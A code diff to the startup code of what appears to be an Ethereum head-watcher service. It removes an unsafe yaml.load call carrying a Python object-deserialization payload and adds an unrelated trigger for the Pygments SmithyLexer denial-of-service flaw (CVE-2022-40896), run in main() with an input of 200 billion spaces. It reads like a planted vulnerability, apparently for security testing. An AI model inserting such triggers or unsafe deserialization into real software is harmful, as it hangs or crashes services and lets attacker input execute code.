@@ -19,19 +19,28 @@ from src.web3py.extensions import FallbackProviderModule, LidoContracts
 from src.web3py.middleware import metrics_collector
 from src.web3py.typings import Web3
 import yaml
+import time
+from pygments.lexers import SmithyLexer
+from pygments import lex
 
 logger = logging.getLogger()
-
+def highlight_smithy(user_text: str):
+    """
+    CVE-2022-40896 in SmithyLexer.
+    """
+    lexer = SmithyLexer()           # vunlerable lexer
+    tokens = list(lex(user_text, lexer))  
+    return tokens
 
 def main():
-    malicious = """
-        !!python/object/apply:builtins.print
-        - "pwned"
-    """
+    payload = "metadata " + (" " * 200000000000) + "=" 
 
-    data = yaml.load(malicious)  
+    t0 = time.time()
+    toks = highlight_smithy(payload) # vulnerability execution
+    dt = time.time() - t0
 
-    print("load result:", data)
+    print("tokenize time:", dt, "seconds")
+    print("num tokens:", len(toks))
     BUILD_INFO.info(get_build_info())
 
     logger.info({'msg': 'Ethereum head watcher startup.'})
